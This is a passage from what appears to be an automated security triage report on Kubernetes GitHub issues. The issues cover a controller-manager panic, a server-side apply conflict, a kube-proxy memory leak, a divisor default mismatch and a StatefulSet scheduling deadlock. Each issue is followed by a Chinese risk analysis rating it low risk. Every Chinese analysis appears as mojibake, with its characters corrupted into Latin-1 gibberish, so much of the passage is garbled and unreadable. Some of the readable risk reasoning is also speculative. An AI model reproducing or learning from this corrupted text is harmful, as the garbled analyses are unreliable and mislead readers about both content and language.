> å½“é£é™©ä¸ºæ‹’ç»æœåŠ¡ï¼ˆDoSï¼‰æ”»å‡»æ—¶ï¼Œå¦‚æœæ”»å‡»è€…éœ€è¦ä¸€å®šæƒé™æ‰èƒ½å¤Ÿå®æ–½è¯¥æ”»å‡»ï¼Œåˆ™è§†æƒ…å†µéœ€è¦é™çº§å¤„ç†ï¼Œå½“æ¼æ´åˆ©ç”¨éœ€è¦æ”»å‡»è€…å…·å¤‡åˆ›å»ºã€ä¿®æ”¹ç­‰éåªè¯»æƒé™æ—¶ï¼Œåˆ™ä¸åº”åˆ¤æ–­ä¸ºé«˜é£é™©ï¼ŒCVSSè¯„çº§åœ¨highä»¥ä¸‹ã€‚

åœ¨æ­¤æƒ…å†µä¸‹ï¼Œæ”»å‡»è€…éœ€è¦å…·æœ‰ä¿®æ”¹Deploymentçš„æƒé™æ‰èƒ½å¼•å…¥è¿™ä¸ªé”™è¯¯é…ç½®ã€‚å› æ­¤ï¼Œè¯¥é£é™©ä¸åº”è¢«åˆ¤å®šä¸ºé«˜é£é™©ã€‚

---

## Issue #128935 kube-controller-manager crash: invalid memory address  or nil pointer dereference

- Issue é“¾æ¥ï¼š[#128935](https://github.com/kubernetes/kubernetes/issues/128935)

### Issue å†…å®¹

#### What happened?

Enabling ingress nginx in version v1.31.2 causes this error stack:
```
I1122 11:02:33.848730       1 job_controller.go:568] "enqueueing job" logger="job-controller" key="ingress-nginx/ingress-nginx-admission-patch" delay="1s"
E1122 11:02:34.022503       1 panic.go:261] "Observed a panic" panic="runtime error: invalid memory address or nil pointer dereference" panicGoValue="\"invalid memory address or nil pointer dereference\"" stacktrace=<
        goroutine 912 [running]:
        k8s.io/apimachinery/pkg/util/runtime.logPanic({0x38483f0, 0x554eb20}, {0x2d9c260, 0x54897b0})
                k8s.io/apimachinery/pkg/util/runtime/runtime.go:107 +0xbc
        k8s.io/apimachinery/pkg/util/runtime.handleCrash({0x38483f0, 0x554eb20}, {0x2d9c260, 0x54897b0}, {0x554eb20, 0x0, 0x43d945?})
                k8s.io/apimachinery/pkg/util/runtime/runtime.go:82 +0x5e
        k8s.io/apimachinery/pkg/util/runtime.HandleCrash({0x0, 0x0, 0xc001a31180?})
                k8s.io/apimachinery/pkg/util/runtime/runtime.go:59 +0x108
        panic({0x2d9c260?, 0x54897b0?})
                runtime/panic.go:770 +0x132
        k8s.io/cloud-provider/controllers/service.(*Controller).needsUpdate(0xc000c491e0, 0xc0022ffb88, 0xc00240cc88)
                k8s.io/cloud-provider/controllers/service/controller.go:586 +0x39a
        k8s.io/cloud-provider/controllers/service.New.func2({0x32711e0?, 0xc0022ffb88?}, {0x32711e0, 0xc00240cc88?})
                k8s.io/cloud-provider/controllers/service/controller.go:144 +0x74
        k8s.io/client-go/tools/cache.ResourceEventHandlerFuncs.OnUpdate(...)
                k8s.io/client-go/tools/cache/controller.go:253
        k8s.io/client-go/tools/cache.(*processorListener).run.func1()
                k8s.io/client-go/tools/cache/shared_informer.go:976 +0xea
        k8s.io/apimachinery/pkg/util/wait.BackoffUntil.func1(0x30?)
                k8s.io/apimachinery/pkg/util/wait/backoff.go:226 +0x33
        k8s.io/apimachinery/pkg/util/wait.BackoffUntil(0xc00258ef70, {0x38135c0, 0xc001a08c90}, 0x1, 0xc001a0aa80)
                k8s.io/apimachinery/pkg/util/wait/backoff.go:227 +0xaf
        k8s.io/apimachinery/pkg/util/wait.JitterUntil(0xc001a39770, 0x3b9aca00, 0x0, 0x1, 0xc001a0aa80)
                k8s.io/apimachinery/pkg/util/wait/backoff.go:204 +0x7f
        k8s.io/apimachinery/pkg/util/wait.Until(...)
                k8s.io/apimachinery/pkg/util/wait/backoff.go:161
        k8s.io/client-go/tools/cache.(*processorListener).run(0xc000d327e0)
                k8s.io/client-go/tools/cache/shared_informer.go:972 +0x69
        k8s.io/apimachinery/pkg/util/wait.(*Group).Start.func1()
                k8s.io/apimachinery/pkg/util/wait/wait.go:72 +0x52
        created by k8s.io/apimachinery/pkg/util/wait.(*Group).Start in goroutine 553
                k8s.io/apimachinery/pkg/util/wait/wait.go:70 +0x73
 >
panic: runtime error: invalid memory address or nil pointer dereference [recovered]
        panic: runtime error: invalid memory address or nil pointer dereference
[signal SIGSEGV: segmentation violation code=0x1 addr=0x28 pc=0x211fb1a]

goroutine 912 [running]:
k8s.io/apimachinery/pkg/util/runtime.handleCrash({0x38483f0, 0x554eb20}, {0x2d9c260, 0x54897b0}, {0x554eb20, 0x0, 0x43d945?})
        k8s.io/apimachinery/pkg/util/runtime/runtime.go:89 +0xee
k8s.io/apimachinery/pkg/util/runtime.HandleCrash({0x0, 0x0, 0xc001a31180?})
        k8s.io/apimachinery/pkg/util/runtime/runtime.go:59 +0x108
panic({0x2d9c260?, 0x54897b0?})
        runtime/panic.go:770 +0x132
k8s.io/cloud-provider/controllers/service.(*Controller).needsUpdate(0xc000c491e0, 0xc0022ffb88, 0xc00240cc88)
        k8s.io/cloud-provider/controllers/service/controller.go:586 +0x39a
k8s.io/cloud-provider/controllers/service.New.func2({0x32711e0?, 0xc0022ffb88?}, {0x32711e0, 0xc00240cc88?})
        k8s.io/cloud-provider/controllers/service/controller.go:144 +0x74
k8s.io/client-go/tools/cache.ResourceEventHandlerFuncs.OnUpdate(...)
        k8s.io/client-go/tools/cache/controller.go:253
k8s.io/client-go/tools/cache.(*processorListener).run.func1()
        k8s.io/client-go/tools/cache/shared_informer.go:976 +0xea
k8s.io/apimachinery/pkg/util/wait.BackoffUntil.func1(0x30?)
        k8s.io/apimachinery/pkg/util/wait/backoff.go:226 +0x33
k8s.io/apimachinery/pkg/util/wait.BackoffUntil(0xc001e63f70, {0x38135c0, 0xc001a08c90}, 0x1, 0xc001a0aa80)
        k8s.io/apimachinery/pkg/util/wait/backoff.go:227 +0xaf
k8s.io/apimachinery/pkg/util/wait.JitterUntil(0xc001a39770, 0x3b9aca00, 0x0, 0x1, 0xc001a0aa80)
        k8s.io/apimachinery/pkg/util/wait/backoff.go:204 +0x7f
k8s.io/apimachinery/pkg/util/wait.Until(...)
        k8s.io/apimachinery/pkg/util/wait/backoff.go:161
k8s.io/client-go/tools/cache.(*processorListener).run(0xc000d327e0)
        k8s.io/client-go/tools/cache/shared_informer.go:972 +0x69
k8s.io/apimachinery/pkg/util/wait.(*Group).Start.func1()
        k8s.io/apimachinery/pkg/util/wait/wait.go:72 +0x52
created by k8s.io/apimachinery/pkg/util/wait.(*Group).Start in goroutine 553
        k8s.io/apimachinery/pkg/util/wait/wait.go:70 +0x73
```

#### What did you expect to happen?

kube-controller-manager does not crash and restart

#### How can we reproduce it (as minimally and precisely as possible)?

- download latest [K2s](https://github.com/Siemens-Healthineers/K2s)
- on windows 10/11 call 
`k2s install` 
(check  [prerequisites](https://github.com/Siemens-Healthineers/K2s/blob/main/docs/op-manual/installing-k2s.md#prerequisites)) in order to create the kubernetes cluster
- the enable the ingress nginx with: 
`k2s addons enable ingress nginx`
- after last step look at crashed kube controller manager with
`k logs kube-controller-manager-kubemaster -n kube-system -p`

#### Anything else we need to know?

_No response_

#### Kubernetes version

<details>

```console
$ kubectl version
# paste output here
```
Client Version: v1.31.2
Kustomize Version: v5.4.2
Server Version: v1.31.2
</details>


#### Cloud provider

<details>

</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
PRETTY_NAME="Debian GNU/Linux 11 (bullseye)"
NAME="Debian GNU/Linux"
VERSION_ID="11"
VERSION="11 (bullseye)"
VERSION_CODENAME=bullseye
ID=debian
HOME_URL="https://www.debian.org/"
SUPPORT_URL="https://www.debian.org/support"
BUG_REPORT_URL="https://bugs.debian.org/"
$ uname -a
Linux kubemaster 5.10.0-33-cloud-amd64 #1 SMP Debian 5.10.226-1 (2024-10-03) x86_64 GNU/Linux

# On Windows:
C:\> wmic os get Caption, Version, BuildNumber, OSArchitecture
```
BuildNumber  Caption                          OSArchitecture  Version
26100        Microsoft Windows 11 Enterprise  64-bit          10.0.26100
</details>


#### Install tools

<details>
[K2s](https://github.com/Siemens-Healthineers/K2s)
</details>


#### Container runtime (CRI) and version (if applicable)

<details>
not applicable
</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>
not applicable
</details>


### åˆ†æç»“æœ

**é£é™©å®šçº§ï¼š**  
ä½é£é™©

**åˆ¤æ–­ä¾æ®ï¼š**  
è¯¥Issueæè¿°äº†åœ¨å¯ç”¨ingress nginx v1.31.2æ—¶ï¼Œkube-controller-managerå‘ç”Ÿå´©æºƒï¼Œå‡ºç°äº†ç©ºæŒ‡é’ˆå¼•ç”¨çš„panicã€‚ä»å †æ ˆä¿¡æ¯æ¥çœ‹ï¼Œå´©æºƒå‘ç”Ÿåœ¨service controllerçš„needsUpdateå‡½æ•°ä¸­ã€‚è¿™å¯èƒ½å¯¼è‡´æ”»å‡»è€…é€šè¿‡æ„é€ ç‰¹å®šçš„Serviceæˆ–å…¶ä»–èµ„æºï¼Œè§¦å‘æ§åˆ¶å™¨ç®¡ç†å™¨å´©æºƒï¼Œé€ æˆæ‹’ç»æœåŠ¡ï¼ˆDoSï¼‰æ”»å‡»ã€‚ç„¶è€Œï¼Œå®æ–½æ­¤æ”»å‡»éœ€è¦æ”»å‡»è€…å…·å¤‡åœ¨é›†ç¾¤ä¸­åˆ›å»ºæˆ–ä¿®æ”¹èµ„æºçš„æƒé™ã€‚æ ¹æ®é£é™©åˆ¤æ–­æ ‡å‡†ï¼Œç¬¬4æ¡æŒ‡å‡ºï¼Œå¦‚æœæ”»å‡»è€…éœ€è¦å…·å¤‡åˆ›å»ºã€ä¿®æ”¹ç­‰éåªè¯»æƒé™ï¼Œåˆ™ä¸åº”åˆ¤æ–­ä¸ºé«˜é£é™©ã€‚å› æ­¤ï¼Œè™½ç„¶å­˜åœ¨å®‰å…¨é£é™©ï¼Œä½†é£é™©è¯„çº§ä¸ºä½é£é™©ã€‚

---

## Issue #128924 Empty pod env var always causes server-side apply conflict

- Issue é“¾æ¥ï¼š[#128924](https://github.com/kubernetes/kubernetes/issues/128924)

### Issue å†…å®¹

#### What happened?

I applied a manifest that contains an empty env var in a `PodTemplate` (like `env: [{ name: foo, value: "" }]`). Then, I tried to apply the same spec, with a different field-manager. This produced a conflict:

```
error: Apply failed with 1 conflict: conflict with "kubectl": .spec.containers[name="foo"].env[name="foo"].value
Please review the fields above--they currently have other managers. Here
are the ways you can resolve this warning:
* If you intend to manage all of these fields, please re-run the apply
  command with the `--force-conflicts` flag.
* If you do not intend to manage all of the fields, please edit your
  manifest to remove references to the fields that should keep their
  current managers.
* You may co-own fields by updating your manifest to match the existing
  value; in this case, you'll become the manager if the other manager(s)
  stop managing the field (remove it from their configuration).
```

#### What did you expect to happen?

I expect the apply to succeed without a conflict, and the field to be co-owned by both managers (since they are both applying the same value).

#### How can we reproduce it (as minimally and precisely as possible)?

Apply the following manifest twice:

1. `kubectl apply --server-side -f ./repro.yaml`
2. `kubectl apply --server-side -f ./repro.yaml --field-manager test`

```yaml
apiVersion: v1
kind: Pod
metadata:
  name: foo
spec:
  containers:
    - name: foo
      image: busybox
      args: ["sleep", "1000"]
      env:
        - name: foo
          value: ""  # works as expected if this field is removed, or set to a non-empty value
```

#### Anything else we need to know?

I don't think this is `kubectl`-specific, it happens when using `client-go` directly as well.

The behaviour around env values is a bit strange in general - if I specify an empty env var value, the value is listed under `managedFields`, but not actually returned in the response object:

```yaml
apiVersion: v1
kind: Pod
metadata:
  managedFields:
  - apiVersion: v1
    fieldsType: FieldsV1
    fieldsV1:
      f:spec:
        f:containers:
          k:{"name":"foo"}:
            .: {}
            f:args: {}
            f:env:
              k:{"name":"foo"}:
                .: {}
                f:name: {}
                f:value: {}  #Â value is a managed field
            f:image: {}
            f:name: {}
  name: foo
  namespace: default
spec:
  containers:
  - args:
    - sleep
    - "1000"
    env:
    - name: foo  # but there is no value in the returned object!
    image: busybox
    name: foo
```

#### Kubernetes version

<details>

```console
> kubectl version
Client Version: v1.31.0
Kustomize Version: v5.4.2
Server Version: v1.31.0
```

</details>


#### Cloud provider

<details>
N/A, using kind
</details>


#### OS version

<details>

N/A, using kind

</details>


#### Install tools

<details>
kind
</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### åˆ†æç»“æœ

**é£é™©å®šçº§ï¼š**  
ä½é£é™©

**åˆ¤æ–­ä¾æ®ï¼š**  
è¯¥Issueæè¿°äº†åœ¨ä½¿ç”¨`kubectl`è¿›è¡ŒæœåŠ¡ç«¯åº”ç”¨ï¼ˆServer-Side Applyï¼‰æ—¶ï¼Œå½“Podçš„ç¯å¢ƒå˜é‡`env`ä¸­åŒ…å«ç©ºå­—ç¬¦ä¸²`value: ""`æ—¶ï¼Œä¸åŒ`field-manager`é‡å¤åº”ç”¨ç›¸åŒçš„é…ç½®ä¼šå¯¼è‡´å†²çªé”™è¯¯ã€‚è¿™å¯èƒ½ä¼šå½±å“åˆ°éƒ¨ç½²æµç¨‹å’Œè‡ªåŠ¨åŒ–CI/CDç®¡é“çš„æ­£å¸¸è¿è¡Œã€‚

ä»å®‰å…¨è§’åº¦æ¥çœ‹ï¼Œè¦åˆ©ç”¨æ­¤é—®é¢˜ï¼Œæ”»å‡»è€…éœ€è¦å…·å¤‡å¯¹Kubernetesé›†ç¾¤èµ„æºçš„åˆ›å»ºæˆ–ä¿®æ”¹æƒé™ï¼Œå³éœ€è¦æœ‰è¾ƒé«˜çš„æ“ä½œæƒé™ã€‚æ ¹æ®é£é™©åˆ¤æ–­æ ‡å‡†ç¬¬4æ¡ï¼Œå¦‚æœæ”»å‡»è€…éœ€è¦åˆ›å»ºã€ä¿®æ”¹ç­‰éåªè¯»æƒé™ï¼Œåˆ™ä¸åº”åˆ¤æ–­ä¸ºé«˜é£é™©ï¼ŒCVSSè¯„çº§åœ¨highä»¥ä¸‹ã€‚

æ­¤å¤–ï¼Œè¯¥é—®é¢˜æœªæ¶‰åŠå‘½ä»¤æ‰§è¡Œã€å®¹å™¨é€ƒé€¸ã€ææƒç­‰é«˜å®‰å…¨é£é™©æ“ä½œï¼Œä¹Ÿæœªå¯¼è‡´æ•æ„Ÿä¿¡æ¯æ³„éœ²ã€‚å› æ­¤ï¼Œç»¼åˆåˆ¤æ–­è¯¥Issueå­˜åœ¨å®‰å…¨é£é™©ï¼Œä½†é£é™©è¯„çº§ä¸ºä½é£é™©ã€‚

---

## Issue #128928 kube-proxy: EndpointSliceCache memory is leaked

- Issue é“¾æ¥ï¼š[#128928](https://github.com/kubernetes/kubernetes/issues/128928)

### Issue å†…å®¹

#### What happened?

The kube-proxy which is using iptables mode occupies about 8G memory in a cluster of our production environment.
[root ~]$ kubectl top pod kube-proxy-22dcr -n kube-system
NAME               CPU(cores)   MEMORY(bytes)   
kube-proxy-22dcr   2127m        7935Mi          
[root ~]$
[root ~]$ kubectl top pod kube-proxy-s5nk6 -n kube-system
NAME               CPU(cores)   MEMORY(bytes)   
kube-proxy-s5nk6   521m         7931Mi          
[ root ~]$ 
[root ~]$ kubectl top pod kube-proxy-zhqnr -n kube-system
NAME               CPU(cores)   MEMORY(bytes)   
kube-proxy-zhqnr   389m         7933Mi          
[root ~]$ kubectl top pod kube-proxy-xsvn7 -n kube-system
NAME               CPU(cores)   MEMORY(bytes)   
kube-proxy-xsvn7   464m         7390Mi          
[ root ~]$ 
<img width="840" alt="Clipboard_Screenshot_1732443822" src="https://github.com/user-attachments/assets/8714624f-bd39-49f1-a467-a8e4ef947274">
<img width="1043" alt="Clipboard_Screenshot_1732443860" src="https://github.com/user-attachments/assets/36998270-1af6-4583-b037-c0c55170a5e7">

On the node, this is only about two thousand three hundred iptables rules.
[centos ~]# iptables-save | wc -l
2358
[centos ~]# 

And the number of pod and service in this cluster is less than 1000.
[root ~]$ kubectl get svc -A | wc -l
414
[root ~]$ kubectl get endpoints -A | wc -l
417
[ root ~]$ kubectl get pod -A | wc -l
831
[root ~]$ kubectl get endpointslices -A | wc -l
552
[root ~]$ 



Here are some results of the reproductionï¼š
1ï¼Œ 
<img width="1223" alt="Clipboard_Screenshot_1732323625" src="https://github.com/user-attachments/assets/c47becc3-013d-4d13-8302-ca43d344d0a7">

2,
  HELP kubeproxy_sync_proxy_rules_endpoint_changes_total [ALPHA] Cumulative proxy rules Endpoint changes
  TYPE kubeproxy_sync_proxy_rules_endpoint_changes_total counter
kubeproxy_sync_proxy_rules_endpoint_changes_total 681443
  HELP kubeproxy_sync_proxy_rules_service_changes_total [ALPHA] Cumulative proxy rules Service changes
  TYPE kubeproxy_sync_proxy_rules_service_changes_total counter
kubeproxy_sync_proxy_rules_service_changes_total 1.363076e+06


#### What did you expect to happen?

when the number of pod and service is less than 1000, the memory should not occupy so much memory (about 8G).

#### How can we reproduce it (as minimally and precisely as possible)?

1, Create service and delete it repeatedly.
2, When creating service, the namespace name or service name should be different from all previously created.
Memory will slowly increase.

#### Anything else we need to know?

_No response_

#### Kubernetes version

v1.30

#### Cloud provider

tke

#### OS version
ubuntu2204


### åˆ†æç»“æœ

**é£é™©å®šçº§ï¼š**  
ä½é£é™©

**åˆ¤æ–­ä¾æ®ï¼š**  
è¯¥é—®é¢˜æè¿°äº†åœ¨ä½¿ç”¨ iptables æ¨¡å¼çš„ kube-proxy ä¸­ï¼Œå½“åå¤åˆ›å»ºå¹¶åˆ é™¤å…·æœ‰ä¸åŒå‘½åç©ºé—´åç§°æˆ–æœåŠ¡åç§°çš„æœåŠ¡æ—¶ï¼Œkube-proxy çš„ EndpointSliceCache å‡ºç°äº†å†…å­˜æ³„æ¼ï¼Œå¯¼è‡´å†…å­˜å ç”¨ä¸æ–­å¢åŠ ï¼Œç”šè‡³è¾¾åˆ°çº¦ 8GBã€‚æ”»å‡»è€…å¦‚æœèƒ½å¤Ÿåœ¨é›†ç¾¤ä¸­å¤§é‡åˆ›å»ºå¹¶åˆ é™¤å”¯ä¸€åç§°çš„æœåŠ¡ï¼Œå¯èƒ½ä¼šå¯¼è‡´ kube-proxy ç»„ä»¶å†…å­˜è€—å°½ï¼Œå½±å“èŠ‚ç‚¹çš„æ­£å¸¸è¿è¡Œï¼Œé€ æˆæ‹’ç»æœåŠ¡ï¼ˆDoSï¼‰æ”»å‡»ã€‚

æ ¹æ®é£é™©åˆ¤æ–­æ ‡å‡†ç¬¬ 4 æ¡ï¼Œé’ˆå¯¹æ‹’ç»æœåŠ¡ï¼ˆDoSï¼‰æ”»å‡»ï¼Œå¦‚æœæ”»å‡»è€…éœ€è¦å…·å¤‡åˆ›å»ºã€ä¿®æ”¹ç­‰éåªè¯»æƒé™ï¼ˆå¦‚åˆ›å»ºå’Œåˆ é™¤æœåŠ¡ï¼‰çš„æ“ä½œèƒ½åŠ›ï¼Œåˆ™ä¸åº”åˆ¤æ–­ä¸ºé«˜é£é™©ï¼ŒCVSS è¯„çº§åœ¨ high ä»¥ä¸‹ã€‚

å› æ­¤ï¼Œè¯¥é—®é¢˜å­˜åœ¨å®‰å…¨é£é™©ï¼Œä½†ç”±äºéœ€è¦éç‰¹æƒç”¨æˆ·æƒé™æ‰èƒ½è¢«åˆ©ç”¨ï¼Œé£é™©è¯„çº§ä¸ºä½é£é™©ã€‚

---

## Issue #128865 resourceFieldRef.divisor when unspecified is set to 0 (documented is 1) 

- Issue é“¾æ¥ï¼š[#128865](https://github.com/kubernetes/kubernetes/issues/128865)

### Issue å†…å®¹

#### What happened?

The divisor key in [ResourceFieldRef](https://kubernetes.io/docs/reference/kubernetes-api/common-definitions/resource-field-selector/#ResourceFieldSelector) is documented to default to 1.

However, when applying a manifest using a resourceFieldRef without specifying the divisor, then checking the spec, the divisor is set to '0'.

#### What did you expect to happen?

The field should either not be present when checking the manifests, or having the correct value.

#### How can we reproduce it (as minimally and precisely as possible)?

On a kubernetes cluster, deploy the following manifest:
```yaml
apiVersion: apps/v1
kind: Deployment
metadata:
  labels:
    app: test-divisor
  name: test-divisor
spec:
  replicas: 1
  selector:
    matchLabels:
      app: test-divisor
  template:
    metadata:
      labels:
        app: test-divisor
    spec:
      containers:
      - image: invalid-name
        name: test-divisor
        resources:
          limits:
            memory: 30M
        env:
        - name: GOMEMLIMIT
          valueFrom:
            resourceFieldRef:
              resource: limits.memory
```

Then run 
```console
$ kubectl get deploy test-divisor -o jsonpath='{.spec.template.spec.containers[0].env[0].valueFrom.resourceFieldRef.divisor}{"\n"}'
0
```

#### Anything else we need to know?

This cause problem for things like argocd which considers the application perpetually out of sync (see cilium/cilium#3063)

#### Kubernetes version

<details>

```console
$ kubectl version
Client Version: v1.31.2
Kustomize Version: v5.4.2
Server Version: v1.29.10
WARNING: version difference between client (1.31) and server (1.29) exceeds the supported minor version skew of +/-1
```

</details>


#### Cloud provider

<details>
None
</details>


#### OS version

<details>

```console
$ cat /etc/os-release
NAME="Arch Linux"
PRETTY_NAME="Arch Linux"
ID=arch
BUILD_ID=rolling
ANSI_COLOR="38;2;23;147;209"
HOME_URL="https://archlinux.org/"
DOCUMENTATION_URL="https://wiki.archlinux.org/"
SUPPORT_URL="https://bbs.archlinux.org/"
BUG_REPORT_URL="https://gitlab.archlinux.org/groups/archlinux/-/issues"
PRIVACY_POLICY_URL="https://terms.archlinux.org/docs/privacy-policy/"
LOGO=archlinux-logo

$ uname -a
Linux framework 6.11.6-arch1-1 #1 SMP PREEMPT_DYNAMIC Fri, 01 Nov 2024 03:30:41 +0000 x86_64 GNU/Linux
```
</details>


#### Install tools

<details>
Kubespray
</details>


#### Container runtime (CRI) and version (if applicable)

_No response_

#### Related plugins (CNI, CSI, ...) and versions (if applicable)

_No response_

### åˆ†æç»“æœ

**é£é™©å®šçº§ï¼š**  
ä½é£é™©

**åˆ¤æ–­ä¾æ®ï¼š**  
è¯¥IssueæŠ¥å‘Šäº†åœ¨Kubernetesä¸­ï¼Œå½“`ResourceFieldRef`çš„`divisor`æœªæŒ‡å®šæ—¶ï¼Œå®é™…åº”ç”¨çš„é…ç½®ä¸­`divisor`è¢«è®¾ç½®ä¸º`0`ï¼Œè€Œæ–‡æ¡£ä¸­æŒ‡å‡ºé»˜è®¤å€¼åº”ä¸º`1`ã€‚è¿™ç§ä¸ä¸€è‡´å¯èƒ½å¯¼è‡´åœ¨ä½¿ç”¨`divisor`è¿›è¡Œé™¤æ³•è®¡ç®—æ—¶å‡ºç°é™¤ä»¥é›¶çš„é”™è¯¯ï¼Œå¼•å‘ç¨‹åºå¼‚å¸¸æˆ–å´©æºƒï¼Œé€ æˆæ‹’ç»æœåŠ¡ï¼ˆDoSï¼‰æ”»å‡»çš„å¯èƒ½æ€§ã€‚

ä½†æ˜¯ï¼Œè¦åˆ©ç”¨æ­¤é—®é¢˜ï¼Œæ”»å‡»è€…éœ€è¦å…·å¤‡åœ¨é›†ç¾¤ä¸­åˆ›å»ºæˆ–ä¿®æ”¹èµ„æºçš„æƒé™ï¼Œå³éœ€è¦è¾ƒé«˜çš„æƒé™æ¥éƒ¨ç½²ç‰¹å®šçš„Manifestæ–‡ä»¶ã€‚

æ ¹æ®é£é™©åˆ¤æ–­æ ‡å‡†ç¬¬4æ¡ï¼Œå½“æ¼æ´åˆ©ç”¨éœ€è¦æ”»å‡»è€…å…·å¤‡åˆ›å»ºã€ä¿®æ”¹ç­‰éåªè¯»æƒé™æ—¶ï¼Œä¸åº”åˆ¤æ–­ä¸ºé«˜é£é™©ï¼ŒCVSSè¯„çº§åœ¨`high`ä»¥ä¸‹ã€‚

å› æ­¤ï¼Œè¯¥Issueå­˜åœ¨å®‰å…¨é£é™©ï¼Œä½†é£é™©è¯„çº§ä¸ºä½é£é™©ã€‚

---

## Issue #128832 Conflicting topologySpreadConstraints, podManagementPolicy: OrderedReady  and PVCs can lead to unschedulable pods in StatefulSets

- Issue é“¾æ¥ï¼š[#128832](https://github.com/kubernetes/kubernetes/issues/128832)

### Issue å†…å®¹

#### What happened?

I honestly don't know if this is a real bug or not, since it seems like the configuration conflicts with itself. I thought I'd file a bug and see what sig-scheduling says, since the behaviour isn't obvious to the user until the situation occurs.

With a StatefulSet it's possible to end up in a situation (after an outage) where some of these Pods are unable to schedule, if the StatefulSet has the following rules:
1. 5 replicas
2. A volumeClaimTemplates
3. Across 3 zones
4. `podManagementPolicy: OrderedReady`
5. A topologySpreadConstraints matching `topologyKey: topology.kubernetes.io/zone` with `maxSkew: 1`

Example StatefulSet below.

When deploying a StatefulSet with this configuration, if 2 Pods are lost, one in the single-pod-zone and another Pod with a lower number, then the StatefulSet is stuck can't replace those Pods due to a conflict of scheduling rules.

Let me try explain with some diagrams.

---

After applying the example StatefulSet, the Pods land in a configuration as such:
![image](https://github.com/user-attachments/assets/d039a682-1982-4272-a0b3-dc201ef4f365)
(Note, each Pod also has a related PVC with it)

This makes sense with all the rules configured and all Pods are healthy.

When `pod-1` and `pod-0` are deleted (due to node failures) we end up with this situation:
![image](https://github.com/user-attachments/assets/3c3e74e2-5404-4b58-bf98-a02246e0d7dd)

The StatefulSet Controller will then create `pod-0` (since `OrderedReady` is configured), but it will try be placed into the `Zone 2` zone (Since we have a maxSkew 1 topologySpreadConstraints zone policy).

However, the PVC for `pod-0` is in Zone 1, meaning that the Pod can never be scheduled. This stops the StatefulSet controller from continuing to `pod-1`.

It seems that the only way to fix this is to temporarily set `maxSkew` to 2 for the topologySpreadConstraints zone policy, or to delete the PVC in Zone 1

#### What did you expect to happen?

It's difficult to way what I expect to happen, because the only way to schedule a Pod is to override the rule that I set as the operator.

Either schedule `pod-0` in the correct zone (bypassing the topologySpreadConstraints zone policy) 
Or schedule `pod-1` first (bypassing `OrderedReady`.

May be this situation is an exception for `OrderedReady`, since the StatefulSet isn't a new one, and is only recovering from a failure.

#### How can we reproduce it (as minimally and precisely as possible)?

```
apiVersion: apps/v1
kind: StatefulSet
metadata:
  name: testing
spec:
  persistentVolumeClaimRetentionPolicy:
    whenDeleted: Retain
    whenScaled: Retain
  podManagementPolicy: OrderedReady
  replicas: 5
  revisionHistoryLimit: 4
  selector:
    matchLabels:
      app.kubernetes.io/name: testing
  serviceName: ""
  template:
    metadata:
      labels:
        app.kubernetes.io/name: testing
    spec:
      automountServiceAccountToken: true
      containers:
      - image: nginx
        imagePullPolicy: IfNotPresent
        name: nginx
        terminationMessagePath: /dev/termination-log
        terminationMessagePolicy: File
        volumeMounts:
        - mountPath: /mount
          name: testing-pvc
      dnsPolicy: ClusterFirst
      restartPolicy: Always
      schedulerName: default-scheduler
      serviceAccount: default
      serviceAccountName: default
      terminationGracePeriodSeconds: 30
      topologySpreadConstraints:
      - labelSelector:
          matchLabels:
            app.kubernetes.io/name: testing
        maxSkew: 1
        nodeTaintsPolicy: Honor
        topologyKey: topology.kubernetes.io/zone
        whenUnsatisfiable: DoNotSchedule
      - labelSelector:
          matchLabels:
            app.kubernetes.io/name: testing
        maxSkew: 1
        nodeTaintsPolicy: Honor
        topologyKey: kubernetes.io/hostname
        whenUnsatisfiable: DoNotSchedule
  updateStrategy:
    rollingUpdate:
      partition: 0
    type: RollingUpdate
  volumeClaimTemplates:
  - apiVersion: v1
    kind: PersistentVolumeClaim
    metadata:
      creationTimestamp: null
      name: testing-pvc
    spec:
      accessModes:
      - ReadWriteOnce
      resources:
        requests:
          storage: 3Gi
      volumeMode: Filesystem
    status:
      phase: Pending
```

#### Anything else we need to know?

Some context of the situation we're in:
1. We're using Ordered Ready, since the [vault-operator](https://github.com/bank-vaults/vault-operator/blob/v1.22.3/pkg/controller/vault/vault_controller.go#L1344-L1347) we use has that hardcoded
2. We want 5 replicas of Vault, due to the [recommendation from Hashicorp](https://developer.hashicorp.com/vault/docs/internals/integrated-storage#quorum-size-and-failure-tolerance).

I imagine if this isn't a Kubernetes bug, I should ask the vault-operator project to allow configurable `podManagementPolicy`, to avoid this situation from happening, however, I assume other users have similar constraints, and somehow fixing it in Kubernetes may be useful.

Some changes we considered:
1. Increasing replicas to 6. This should solve the problem, but conflicts with Hashicorp's suggestion of [running 5 replicas](https://developer.hashicorp.com/vault/docs/internals/integrated-storage#quorum-size-and-failure-tolerance).
2. Change maxSkew to 2. This actually helps un-stuck the pods, but on initial deployment it won't guarantee even spread across all AZs.

#### Kubernetes version

<details>

```console
$ kubectl version
Client Version: v1.31.1
Kustomize Version: v5.4.2
Server Version: v1.30.2```

</details>


#### Cloud provider

<details>
AWS via kOps
</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
# paste output here
$ uname -a
# paste output here

# On Windows:
C:\> wmic os get Caption, Version, BuildNumber, OSArchitecture
# paste output here
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>

/sig scheduling

### åˆ†æç»“æœ

**é£é™©å®šçº§ï¼š**  
ä½é£é™©

**åˆ¤æ–­ä¾æ®ï¼š**  
è¯¥Issueæè¿°äº†åœ¨Kubernetesä¸­ï¼Œä½¿ç”¨StatefulSetæ—¶ï¼Œå¦‚æœé…ç½®äº†`podManagementPolicy: OrderedReady`ï¼Œå¹¶ä¸”è®¾ç½®äº†`topologySpreadConstraints`çš„`maxSkew: 1`ï¼Œåœ¨å¤šå¯ç”¨åŒºéƒ¨ç½²æƒ…å†µä¸‹ï¼Œå½“æŸäº›Podå’Œå¯¹åº”çš„PVCä¸¢å¤±æ—¶ï¼Œç”±äºè°ƒåº¦çº¦æŸå’ŒPVCæ‰€åœ¨åŒºåŸŸä¸ä¸€è‡´ï¼Œå¯¼è‡´Podæ— æ³•è°ƒåº¦ï¼ŒStatefulSetæ— æ³•ç»§ç»­åˆ›å»ºåç»­çš„Podã€‚

